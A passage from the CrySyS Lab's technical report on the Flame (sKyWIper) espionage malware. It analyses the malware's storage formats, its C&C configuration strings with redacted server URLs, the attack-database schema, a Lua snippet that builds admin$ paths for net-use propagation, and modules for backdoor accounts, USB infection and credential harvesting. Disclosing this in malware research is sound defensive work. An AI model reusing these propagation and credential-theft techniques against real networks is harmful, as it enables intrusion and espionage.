HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 NAME NOT FOUND Length: 144\n23:35:39,6277806 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 NAME NOT FOUND Length: 144\n23:35:39,6278907 rundll32.exe 2388 RegSetValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:35:39,6292151 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:35:39,6293931 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:35:39,6294881 rundll32.exe 2388 RegSetValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:35:50,6732487 alg.exe 2848 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:36:17,4627582 services.exe 748 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:36:17,5738388 services.exe 748 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:36:23,7643698 iexplore.exe 3240 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: \n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 33\n\n\n-----\n\n|23:36:43,0717217 iexplore.exe 3520 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data: 23:37:02,2292562 iexplore.exe 3632 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave8 SUCCESS Type: REG_SZ, Length: 2, Data:|Col2|\n|---|---|\n\n\n**Figure 26 – Wave8 communications**\n\n### 4.3. Compression and table formats\n\nThe file ntcache.dat found among the DAT files contains logs from the inspected target\ncomputer. However, there are references for ntcache.dat as SFS Storage.\n```\nSTORAGE.SFS.FILES.ntcache?dat.REINITIALIZE_ME\nSTORAGE.SFS.FILES.ntcache?dat.DELETE_ME\nSTORAGE.SFS.FILES.lmcache?dat.MAX_SIZE\nSTORAGE.SFS.FILES.lmcache?dat.BACKUPsKyWIper\n\n```\n**Figure 27 –Winlogon.exe with injected code working with ccalc32.sys - procmon**\n\nWe present the beginning of the binary format for ntcache.dat below.\n```\n0000000000: 02 30 30 30 30 30 30 31 │ 45 5C 30 30 30 30 30 30 ☻0000001E\\000000\n0000000010: 30 30 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00 00\n0000000020: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000030: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000040: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000050: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000060: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000070: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000080: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000090: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000A0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000B0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000C0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000D0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000E0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n00000000F0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 00 00 00 00\n0000000100: 00 96 02 00 00 E6 57 1B │ 5B 5E 88 CC 01 01 00 00  ľ☻ ŠW←[^ł╠☺☺\n0000000110: 00 28 01 0A 00 00 00 FF │ FF 00 00 43 00 4D 00 44  (☺◙    C M D\n0000000120: 00 02 00 00 00 33 00 0C │ 00 00 00 FF FF 00 00 44  ☻  3 ♀    D\n0000000130: 00 45 00 53 00 43 00 0C │ 00 00 00 42 00 47 00 66  E S C ♀  B G f\n0000000140: 00 4C 00 6F 00 77 00 2A │ 00 00 00 FF FF 00 00 52  L o w *    R\n0000000150: 00 45 00 51 00 55 00 45 │ 00 53 00 54 00 45 00 44  E Q U E S T E D\n\n```\n`0000000160: 00 5F 00 46 00` `49` `00 4C` │ 00 45 00 5F 00 4E 00 41  _ F I L E _ N A\n\n**Figure 28 – Binary format of ntcache.dat (beginning)**\n\nWe could not decide if the format is custom or just some strange binary format. A\ncomparison with ~HLV473.tmp, a file that contains a list of running processes, reveals the\nsequences “78 DA ED” and “78 DA 73” standing for a zlib inflate compressed format.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 34\n\n\n-----\n\n|0000000EF0: 00 00 00 00 00 00 00 00 │ 00 00 00 00 2B A0 80 B1 +áÇ▒ 0000000F00: 01 06 00 00 00 78 DA ED │ 9D 5B 6C 1D C7 79 C7 F7 ☺♠ x┌ÝŁ[l↔ăyă¸ 0000000F10: 90 94 A2 9B 15 56 37 D3 │ 94 AA 9E 28 B2 2C 2B 0A ÉöóŤ§V7Ëö¬×(▓,+◙|Col2|\n|---|---|\n\n\n**Figure 29 – “78 DA ED” compressed record in ntcache.dat**\n```\n0000000000: 78 DA 73 E0 67 60 E0 65 │ 60 60 60 01 E2 FF FF 19 xÚsŕg`ŕe```☺â˙˙↓\n0000000010: 18 18 81 34 63 02 1B 03 │ 03 3F 10 E8 00 39 22 40 ↑↑?4c☻←♥♥?►č 9\"@\n\n```\n`0000000020: CC 03 C4 1C 40` `3C` `81 E5` │ BE 64 68 DB 19 90 1A B0 Ě♥Ä∟@<?ĺľdhŰ↓?→°\n\n**Figure 30 – “78 DA 73” compressed record in ~HLV473.tmp**\n\nAfter decompression, we observe the following:\n\n`0000000000: 40 0F 00 00 0D 00 00 00 │ 04 00 00 00 FF FF 00 00 @☼` ♪ ♦  ˙˙\n`0000000010: 01 00 00 00 01 60 06 00 │ 00 0F 0F 0F 0F 2C 00 00 ☺` ☺`♠ ☼☼☼☼,\n`0000000020: 00 14 00 00 00 0C 00 00 │ 00 08 00 00 00 90 04 DF  ¶  ♀` ◘  ?♦ß\n`0000000030: 19 55 86 CC 01 00 00 00 │ 00 0F 0F 0F 0F 28 00 00 ↓U┼Ě☺` ☼☼☼☼(\n`0000000040: 00 18 02 00 00 10 02 00 │ 00 0C 02 00 00 FF FF 00  ↑☻` - ♀☻ ˙˙\n```\n0000000050: 00 46 00 61 00 72 00 2E │ 00 65 00 78 00 65 00 00  F a r . e x e\n0000000060: 00 20 00 20 00 20 00 20 │ 00 20 00 20 00 20 00 20\n\n```\n`0000000070: 00 20 00 20 00` `20` `00 20` │ 00 20 00 20 00 20 00 20\n\n**Figure 31 – “78 DA 73” compressed record decompressed beginning from ~HLV473.tmp –**\n**information on running processes inside (Far.exe)**\n\nWe also found PPMd compression format in ntcache.dat, probably marked by “8F AF AC 84”.\nThis is used by some libraries and programs including 7-zip, winzip, perl Compress:PPMd.\n```\n0000000450: 00 00 00 00 02 00 43 01 │ 24 65 B3 A9 3A AF 59 00   ☻ C☺$e│ę:»Y\n0000000460: 00 00 55 00 00 00 8F AF │ AC 84 0F 01 9A 46 20 4F  U  Ć»Čä☼☺ÜF O\n\n```\n`0000000470: ED 10 62 9C E0` `42` `02 D4` │ 82 83 AF 02 6F CE DE 7D Ý►bťÓB☻ďéâ»☻o╬Ů}\n\n**Figure 32 – “8F AF AC 84” PPMd compressed record in ntcache.dat**\n\nThe same PPMd compression is used in the advnetcfg.ocx info-stealer (?) module:\n```\n.text:1002E2F4         lea   eax, [ebp+var_24]\n.text:1002E2F7         push  eax\n.text:1002E2F8         push  4\n.text:1002E2FA         pop   ebx\n.text:1002E2FB         mov   [ebp+var_10], 84ACAF8Fh ; PMMD magic\n.text:1002E302         call  sub_1000C28D\n.text:1002E307         mov   byte ptr [ebp+var_4], 1\n.text:1002E30B         mov   ebx, eax\n.text:1002E30D         call  sub_1000C439\n.text:1002E312      mov   byte ptr [ebp+var_4], 0\n\n```\n**Figure 33 – “8F AF AC 84” magic usage in advnetcfg.ocx**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 35\n\n\n-----\n\nMany DAT files have the following structure: A table is stored in a file, containing key-value\npairs. The key-value pairs are separated by multiple 0xFF characters (like padding), in some\nfiles with multiple 0xAE characters (Duqu often used 0xAE as well). Between the key and\nvalue 0xFF, 0xFE separates the data.\n\nThe ~DEB93D files contain Samba / nmb lookups in a proprietary table format\n```\n0000000000: 26 C1 30 0E 51 36 XX 4F │ 03 00 00 22 00 00 00 31 &Á0♫Q6XO♥ \"  1\n0000000010: 00 39 00 32 00 2E 00 31 │ 00 36 00 38 00 2E 00 30  9 2 . 1 6 8 . 0\n0000000020: 00 2E 00 31 00 31 00 20 │ 00 57 00 50 00 41 00 44  . 1 1  W P A D\n0000000030: 00 52 36 XX 4F 03 00 00 │ 22 00 00 00 31 00 39 00  R6XO♥ \"  1 9\n0000000040: 32 00 2E 00 31 00 36 00 │ 38 00 2E 00 30 00 2E 00 2 . 1 6 8 . 0 .\n0000000050: 31 00 31 00 20 00 57 00 │ 50 00 41 00 44 00 52 36 1 1  W P A D R6\n0000000060: XX 4F 03 00 00 2E 00 00 │ 00 31 00 39 00 32 00 2E XO♥ .  1 9 2 .\n0000000070: 00 31 00 36 00 38 00 2E │ 00 30 00 2E 00 31 00 31  1 6 8 . 0 . 1 1\n0000000080: 00 20 00 47 00 4F 00 4F │ 00 47 00 4C 00 45 00 2E   G O O G L E .\n\n```\n`0000000090: 00 43 00 4F 00` `4D` `00 53` │ 36 XX 4F 03 00 00 22 00  C O M S6XO♥ \"\n\n**Figure 34 – “8F AF AC 84” PPMd compressed record in ntcache.dat**\n\nThe table format is as follows: Ater 4 bytes header every record begins with UNIX timestamp\n(like 0x4FXX3651 in the figure), then “03 00 00” is some kind of record header, “22” refers to\nrecord length, but you should add 3, as the next “00 00 00” is not strictly related to the\nrecord, so the real payload without the “00 00 00” string is 0x22 bytes long.\n\nMost of the records are readable queries like the ones above, but some contain raw samba\nprotocol data.\n\nThe creation of ~DEB93D files are connected to nteps32 export functions, possibly\nEnableSHR, but this is not confirmed yet.\n\n### 4.4. Data storage formats\n\nAlthough the HLV and KWI file formats are not yet fully understood, these files contain data\nresembling to database table records and some records of the above described compressed\nformats.\n\nFrom the extracted contents of some of these data files we found that they all (HLV, KWI,\nand even ntcache.dat) contain basic information on running processes. The information is\nabout 1000-2000 bytes of redundant data. It contains the actual status of the running\nprogram, and in some cases, historical data as well. In some cases, they seem to contain\nscreenshot related information besides the list of running processes.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 36\n\n\n-----\n\nFurther investigations on these files indicated that the KWI files have different purpose as\nshown in the figures below:\n```\nHighSeverityStorageFileName - KWI989.tmp\nLowSeverityStorageFileName - KWI988.tmp\n\n```\n**Figure 35 – KWI file names found in ccalc32drv.sys, labels hint the purpose of the KWI files**\n```\n%CommonProgramFiles%\\Microsoft Shared\\MSAudio\\\n%CommonProgramFiles%\\Microsoft Shared\\MSSecurityMgr\\\n%CommonProgramFiles%\\Microsoft Shared\\MSAPackages\\\n\n```\n**Figure 36 – Dat Storage – possible locations (this is the same as Nteps32 exports)**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 37\n\n\n-----\n\n### 4.5. Logging file list\n\nThe malware saves ~rf<number> files in /windows/temp. This operation seems to be\nautomatic, but perhaps it may also be remotely controlled. These files are encrypted with\nthe E1 encryption algorithm (see above). After decryption, the file appears to be an SQLite3\ndatabase, storing information on drivers, directories, and file names.\n\n**Figure 37 – SQLite database format for ~rf files [file db]**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 38\n\n\n-----\n\n**Figure 38 –File list of the file system in the ~rf files**\n\n**_Discussion:_**\n\nStoring full directory listing in SQLite databases is something you won’t expect from a\nmalware. It’s very strange as it raises complexity and the need for space, and in addition it\nleaks information through the database structure.\n\nNote that the “SQLite browser” application cannot see full filenames as they are stored in\nUnicode format in blob entries, and the first \\x00 stops viewing them.\n\n### 4.6. Saving additional information\n\nThe malware is curious about lot of things. Some examples from the long list of interests are\nshown in the figure below:\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 39\n\n\n-----\n\n|HKLM\\Security\\Policy\\PolSecretEncryptionKey – string double compressed in res146 select * from CIM_HostedAccessPoint↑ ? root\\cimv2▲ ? Access PointsW –string from res146, compressed F HKIU\\Software\\Microsoft\\office -?? res146 compressed string HKIU\\Software\\Adobe\\Adobe Acrobat – surely interesting from propagation perspective. res146 compressed string HKIU\\Network – res146 compressed string HKLM\\SAM\\SAM\\Domains\\Account\\F♥ P – string from res146 compressed strings|Col2|\n|---|---|\n\n\n**Figure 39 – Items the malware is interested in**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 40\n\n\n-----\n\n## 5. C&C communication\n\nC&C communication is defined under the name GATOR. Resource 146 contains key-value\npairs or templates related to GATOR configuration.\n```\nGATOR.CMD.SUCCESS_VALIDITY\nGATOR.LEAK.MIN_BYTES_TO_LEAK\nGATOR.LEAK.SUICIDE_LOG_LEAK_SIZE\nGATOR.LEAK.BANDWITH_CALCULATOR.LEAK_SECS\nGATOR.INTERNET_CHECK.MIN_TIME_BETWEEN_CHECKS\nGATOR.INTERNET_CHECK.CURRENT_FAILURES_COUNT\nGATOR.INTERNET_CHECK.SERVERS.size\nGATOR.INTERNET_CHECK.SERVERS.1.prev\nGATOR.INTERNET_CHECK.SERVERS.1.next\nGATOR.INTERNET_CHECK.SERVERS.1.data\nGATOR.INTERNET_CHECK.SERVERS.1.data.TIMEOUT\nGATOR.INTERNET_CHECK.SERVERS.1.data.URL\nGATOR.INTERNET_CHECK.SERVERS.1.data.VALIDITY\n(servers are stored in the file from 1 to 6)\nGATOR.SERVERS.size\nGATOR.SERVERS.first\nGATOR.SERVERS.last\nGATOR.SERVERS.free\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.next\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.data.USESSL\nGATOR.SERVERS.1.data.PORT\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.prev\nGATOR.SERVERS.1.prev\n(gator servers are defined from 1 to 5)\n\n```\n**Figure 40 – Gator communication related data in resource 146 of mssecmgr.ocx (main module)**\n\nWe received information of more than 50 different domain names related to the C&C\ncommunication and more than 15 distinct IP addresses. C&C servers are changed frequently\nby changing the IP address of the particular host/domain name (the well-known fluxing\ntechnique used by botnets).\n\nMany more configuration settings and logs for C&C communications can be found in the\nto691.tmp file.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 41\n\n\n-----\n\n|C:\\Program Files\\Common Files\\Microsoft Shared\\MSAuthCtrl\\secindex.dat https://XXXX.info:443/cgi-bin/counter.cgi https://XXXX.info:443/cgi-bin/counter.cgi … GATOR.SERVERS.1.data.SITE SINGLE_CMD_RUNNER GATOR.SERVERS.1.data.SITE XXXX.info->XXXXX.com GATOR.SERVERS.1.data.URL cgi-bin/counter.cgi->wp-content/rss.php … GATOR.SERVERS.-1.SITE [NoValue]->XXXX.info GATOR.SERVERS.-1.USESSL [NoValue]->False GATOR.SERVERS.-1.TIMEOUT [NoValue]->180000 GATOR.SERVERS.-1.URL [NoValue]->wp-content/rss.php GATOR.SERVERS.-1.PORT [NoValue]->80 GATOR.SERVERS.-1.PASSWORD [NoValue]->LifeStyle2 … XXX.info SINGLE_CMD_RUNNER P_CMDS.RESTORE_REDIRECTION_STATE SINGLE_CMD_RUNNER SINGLE_CMD_RUNNER P_CMDS.RESTORE_REDIRECTION_STATE.SECS_BETWEEN_RUNS [NoValue]->87654 P_CMDS.RESTORE_REDIRECTION_STATE.MAX_RUNS [NoValue]->2 P_CMDS.RESTORE_REDIRECTION_STATE.CMD_BUF [NoValue]->BUF_SITE:271 CRC:525FXXXX P_CMDS.RESTORE_REDIRECTION_STATE.NUM_OF_RUNS [NoValue]->0 SINGLE_CMD_RUNNER SINGLE_CMD_RUNNER GATOR.LEAK.NEXT_REQUEST_TIME 314821->1222222222 GATOR.LEAK.NEXT_REQUEST_SYS_TIME 133XXX2106->1222222222 SINGLE_CMD_RUNNER SINGLE_CMD_RUNNER MANAGER.FLAME_ID 13XXXXX15X->13 SINGLE_CMD_RUNNER SINGLE_CMD_RUNNER GATOR.CMD.NEXT_REQUEST_TIME 340504->0 … COMAGENT COMAGENTWORKER WEASEL IDLER CommandExecuter CommandFileFinder MICROBE MICROBE_SECURITY GadgetSupplierWaitThread MICROBE_SECURITY MICROBE SINGLE_CMD_RUNNER C:\\WINDOWS\\system32\\advpck.dat C:\\WINDOWS\\system32\\advpck.dat, EnableTBS C:\\WINDOWS\\system32\\advpck.dat C:\\WINDOWS\\system32\\ntaps.dat, EnableSHR C:\\WINDOWS\\system32\\ntaps.dat, EnableOFR|Col2|\n|---|---|\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 42\n\n\n-----\n\n|SINGLE_CMD_RUNNER|Col2|\n|---|---|\n\n\n**Figure 41 – To691.tmp strings on C&C communications and other activity**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 43\n\n\n-----\n\n## 6. Attack details – dictionary and scripts\n\nThe file dstrlog.dat contains a ClanDB for names and terms used by the malware, an SQLite\ndatabase used for attacks. This file is loaded through libclandb.lua by SQL commands, and\nthe database is accessed using Lua scripts. We disclose detailed description of the SQLite\ndatabase to show the SQL tables used for attacks. The attackers even take care of versions,\nand update the structure if necessary. The sample below shows a version upgrade script.\n```\nif userVer == 1 or userVer == 2 then l_26_0:exec(\"\\n      \nALTER TABLE entities ADD COLUMN tool_id INTEGER NULL;\\n\nALTER TABLE entities ADD COLUMN first_update_dt DATETIME INTEGER NULL;\\n      \nALTER TABLE entities ADD COLUMN last_update_dt DATETIME INTEGER NULL;\\n\nALTER TABLE entities ADD COLUMN last_ip_update_dt DATETIME INTEGER NULL;\\n      \nALTER TABLE metadata ADD COLUMN first_update_dt DATETIME INTEGER NULL;\\n      \nALTER TABLE metadata ADD COLUMN last_update_dt DATETIME INTEGER NULL;\\n      \nALTER TABLE attack_log ADD COLUMN home_id INTEGER NULL;\\n\nALTER TABLE attack_log ADD COLUMN date_dt DATETIME INTEGER NULL;\\n\nALTER TABLE attack_queue ADD COLUMN min_attack_interval INTEGER NULL;\\n      \nALTER TABLE attack_queue ADD COLUMN home_id INTEGER NULL;\\n      ALTER TABLE\nattack_queue ADD COLUMN last_try_date_dt DATETIME INTEGER NULL;\\n\nALTER TABLE attack_queue ADD COLUMN igno\nre_max BOOLEAN INTEGER NOT NULL DEFAULT 0;\\n\\n\\t\\t\\tCREATE TABLE IF NOT EXISTS\ncruise_attack_log (\\n\\t\\t\\t log_id INTEGER NOT NULL REFERENCES\nattack_log(line_id),\\n\\t\\t\\t user_sid TEXT NOT NULL,\\n\\t\\t\\t usersKyWIper TEXT\nNULL\\n\\t\\t\\t);\\n\\n\n\\t\\t\\tCREATE TABLE IF NOT EXISTS options_per_entity (\\n\\t\\t\\t entity_id INTEGER\nNOT NULL,\\n\\t\\t\\t attack_type TEXT NOT NULL,\\n\\t\\t\\t cred_id INTEGER\nNULL,\\n\\t\\t\\t retries_left INTEGER NULL\\n\\t\\t\\t);\\n\\n      CREATE TABLE IF\nNOT EXISTS attack_params (\\n         attack_queue_id INTEGER NOT NULL,\\n\nname TEXT NOT NULL,\\n\nvalue NUMERIC NULL,\\n\\n\nPRIMARY KEY(attack_queue_id, name)\\n      );\")\n\n```\n**Figure 42 – ClanDB update if version is too old**\n\nThere are a number of names and phrases in the database used in the code of the malware.\nDeeper analysis is needed to fully understand all these references. Here, we include the\nresult of our initial investigation with a note that these interpretations might not be correct.\n\n**Boost: Possibly information gathering based on enquiries received from remote parties.**\n\n**Flame: Common name for attacks, most likely by exploits. Ef_trace.txt relation.**\n%temp%\\dat3C.tmp and %systemroot%\\\\temp\\\\msdclr64.ocx related.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 44\n\n\n-----\n\n**Flask: Attacks can be Jimmy or Flask. Probably Flask is one flame. Not sure.**\n\n**Jimmy: A specific CLAN attack type, but also a flame. CLAN probably refers to a local**\nnetwork attack while flame can be anything. Based on dll:\n“c:\\Projects\\Jimmy\\jimmydll_v2.0\\JimmyForClan\\Jimmy\\bin\\srelease\\jimmydll\\inds\nvc32.pdb” reference can be found in it\n\n**Movefile: No information**\n\n**Munch: Installation/propagation mechanism related to windows update and web**\ndownloads. Strings and possibly code can be found in mscrypt.dat\n```\nMUNCH.GENERIC_BUFFERS.4.data.PATTERN\n?*/windowsupdate/?/?elf?pdate/WSUS3/x86/Vista/WUClient-SelfUpdateActiveX~31bf3856ad364e35~x86~~7.0.6000.381.cab*??\nv6/windowsupdate/redir/wuredir.cab\nv7/windowsupdate/redir/wuredir.cab\nv8/windowsupdate/redir/muv3wuredir.cab\nv9/windowsupdate/redir/muv4wuredir.cab\nVISTA_7_VERSION_S\n*/version_s.xml\nMUIDENT\nmuident.cab\n/windowsupdate/?/?elf?pdate/WSUS3/x86/Vista/wsus3setup.cab\ndownload.windowsupdate.com/v6/windowsupdate/?/SelfUpdate/AU/x86/XP/en/wusetup.cab\n/v9/windowsupdate/?/SelfUpdate/AU/x86/W2KSP2/*/wusetup.cab\n/v9/windowsupdate/?/?elf?pdate/WSUS3/x86/Other/wsus3setup.cab\nv7/windowsupdate/redir/wuredir.cab\nv9/windowsupdate/redir/muv4wuredir.cab\n\n```\n**Figure 43 – Munch attack related interesting strings**\n\n**SFS:** Storage files. Some DAT files, like ntcache.dat, lmcache.dat.\n\n**Snack: Related to Munch attack, possibly part of local propagation by exploit.**\n\n**Spotter: Possibly some scanner**\n\n**Transport: Replication method. Exploit-based propagation is most likely called flame, while**\nthat based on bad access permissions is a “Transport”. E.g. “NU” or “NUSystem”\nrefers to “net use” way of propagation.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 45\n\n\n-----\n\n|obj.REMOTE_PATH_TEMPLATES = {temp = string.format(\"\\\\\\\\%s\\\\admin$\\\\temp\", l_4_0.tgt), systemroot = string.format(\"\\\\\\\\%s\\\\admin$\", l_4_0.tgt), commonprogramfiles = string.format(\"\\\\\\\\%s\\\\%s$\\\\Program Files\\\\Common Files\", l_4_0.tgt, remoteSystemDrive)} obj.REMOTE_PATH_TEMPLATES.windir = obj.REMOTE_PATH_TEMPLATES.systemroot obj.REMOTE_LOCAL_PATH_TEMPLATES = {temp = \"..\\\\temp\"}|Col2|\n|---|---|\n\n\n**Figure 44 – Net use based propagation targets get configured**\n\n**Euphoria: “EuphoriaApp” handling. Related to a “Flame” attack. Related to “mediaId”.**\nPossibly file leaking after successful attack.\n\n**BUENO_FLAME_DLL_KEY – pointer to a large 1 MB binary in wpgfilter.dat**\n\n**CONFIG_TABLE : Referred from Lua code for configuration directives. Contains lot of**\nparameters for attacks. Not sure which configuration is that.\n\n**Headache: Related to multiple attacks, possibly additional parameters or properties of the**\nattacks.\n\nMultiple phrases are related to animals in the malware:\n\n**Gator: Windowsupdate based internet-check. If everything successful, things go on. If not,**\nthen there is a minimum and maximum waiting time defined, and a multiplier to\nincrease retries slowly.\n\n**Goat: Possibly C&C communications to GOAT servers**\n\n**Frog: ??**\n\n**Beetlejuice: ??**\n\n**Microbe: ??**\n\n**Weasel: ??**\n\nGreat work is going on the topic! on 30/05 new information was published by Kasperksy\n\nIt’s available at https://www.securelist.com/en/blog?weblogid=208193538#w208193538\n\nWe updated this document to reflect up-to-date information on 30/05/2012.\n\nSo from Kaspersky:\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 46\n\n\n-----\n\nHere is a brief overview of the available units. The names were extracted from the binary and\nthe 146 resource.\n\nBluetooth: enumerates devices around the infected machine.\nMay turn itself into a “beacon”: announces the computer as a discoverable\n\nBeetlejuice\n\ndevice and encode the status of the malware in device information using\nbase64.\n\nRecords audio from existing hardware sources. Lists all multimedia devices,\n\nMicrobe stores complete device configuration, tries to select suitable recording\n\ndevice.\n\nSelects one of the methods for infecting media, i.e. USB disks. Available\nInfectmedia\nmethods: Autorun_infector, Euphoria.\n\nCreates “autorun.inf” that contains the malware and starts with a custom\n\nAutorun_infector “open” command. The same method was used by Stuxnet before it\n\nemployed the LNK exploit.\n\nCreate a “junction point” directory with “desktop.ini” and “target.lnk” from\nEuphoria LINK1 and LINK2 entries of resource 146 (were not present in the resource\nfile). The directory acts as a shortcut for launching Flame.\n\nCreates backdoor accounts with login “HelpAssistant” on the machines\nLimbo\nwithin the network domain if appropriate rights are available.\n\nInfect machines using pre-defined user accounts. The only user account\nFrog specified in the configuration resource is “HelpAssistant” that is created by\nthe “Limbo” attack.\nMunch HTTP server that responds to “/view.php” and “/wpad.dat” requests.\n\nListens on network interfaces, receives and saves NBNS packets in a log\nSnack file. Has an option to start only when “Munch” is started. Collected data is\nthen used for replicating by network.\n\nBoot_dll_loader [Configuration section that contains the list of all additional modules that ]\nshould be loaded and started.\nWeasel Creates a directory listing of the infected computer.\nBoost Creates a list of “interesting” files using several filename masks.\nTelemetry Logging facilities\n\nWhen an Internet connection becomes available, it connects to the C&C\nGator\nservers, downloads new modules, and uploads collected data.\n\nIdentifies programs that may be hazardous to Flame, i.e., anti-virus\nSecurity\nprograms and firewalls.\nBunny\nDbquery\nDriller The purpose of these modules is not yet known.\nHeadache\nGadget\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 47\n\n|the 146 resource.|Col2|\n|---|---|\n|Beetlejuice|Bluetooth: enumerates devices around the infected machine. May turn itself into a “beacon”: announces the computer as a discoverable device and encode the status of the malware in device information using base64.|\n|Microbe|Records audio from existing hardware sources. Lists all multimedia devices, stores complete device configuration, tries to select suitable recording device.|\n|Infectmedia|Selects one of the methods for infecting media, i.e. USB disks. Available methods: Autorun_infector, Euphoria.|\n|Autorun_infector|Creates “autorun.inf” that contains the malware and starts with a custom “open” command. The same method was used by Stuxnet before it employed the LNK exploit.|\n|Euphoria|Create a “junction point” directory with “desktop.ini” and “target.lnk” from LINK1 and LINK2 entries of resource 146 (were not present in the resource file). The directory acts as a shortcut for launching Flame.|\n|Limbo|Creates backdoor accounts with login “HelpAssistant” on the machines within the network domain if appropriate rights are available.|\n|Frog|Infect machines using pre-defined user accounts. The only user account specified in the configuration resource is “HelpAssistant” that is created by the “Limbo” attack.|\n|Munch|HTTP server that responds to “/view.php” and “/wpad.dat” requests.|\n|Snack|Listens on network interfaces, receives and saves NBNS packets in a log file. Has an option to start only when “Munch” is started. Collected data is then used for replicating by network.|\n|Boot_dll_loader|Configuration section that contains the list of all additional modules that should be loaded and started.|\n|Weasel|Creates a directory listing of the infected computer.|\n|Boost|Creates a list of “interesting” files using several filename masks.|\n|Telemetry|Logging facilities|\n|Gator|When an Internet connection becomes available, it connects to the C&C servers, downloads new modules, and uploads collected data.|\n|Security|Identifies programs that may be hazardous to Flame, i.e., anti-virus programs and firewalls.|\n|Bunny Dbquery Driller Headache Gadget|The purpose of these modules is not yet known.|\n\n\n-----\n\n### 6.1. Some interesting Lua scripts inside the code\n\n**_CRUISE_CRED.lua_**\n\nThe script gathers credential information from an already infected machine. More precisely,\nit cruises all the token objects to find the ones belong to the administrator or the\nAdministrators, Domain Admins groups. If it is successful, it updates cruiseAttackLog in the\n“CLAN” database by means of the user sd and the user name. For more information, please\nsee the Tables creds and cruise_attack_log in Figure 48.\n\n**_basic_info_app.lua_**\n\nThe script gathers basic information about an infected computer such as the flame version it\nhas been infected with, the computer name, the ip address of the machine. Furthermore, it\nbooks various parameters about the nature of information leak (e.g.,\nAVERAGE_LEAK_BANDWIDTH, LAST_LEAK_TO_INTERNET, MEDIA_LEAKS_FROM_THIS_\nCOMPUTER, etc). Note that the FLAME_VERSION parameter must have been used to avoid\nthe reinfection of the same computer and also to update flame if it is neccessary.\n\n**_clan_seclog.lua_**\n\nThe script parses the Security log by searching for certain event Ids and retrieves the\ncorrespondig username and ip information from it. It is supposedly used to collect\ninformation about the traces of infection, or the credentials and source IPs used to\nauthenticate to the infected machine. The script examines the following event Ids, where\nthe corresponding log entries store the required pieces of information 